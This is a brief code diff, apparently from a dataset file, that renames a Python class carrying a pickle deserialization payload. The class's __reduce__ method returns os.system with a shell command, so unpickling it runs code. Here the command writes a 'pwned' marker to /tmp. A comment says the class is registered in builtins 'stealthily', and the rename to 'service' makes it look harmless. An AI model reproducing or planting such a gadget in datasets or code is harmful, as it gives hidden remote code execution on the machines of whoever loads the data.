@@ -2,10 +2,10 @@
 import builtins
 import os
 
-class data:
+class service:
     def __reduce__(self):
         return (os.system, ("echo 'RCE from dataset' > /tmp/pwned.txt",))
 
 # Register in builtins stealthily
-builtins.data = data
+builtins.service = service
 
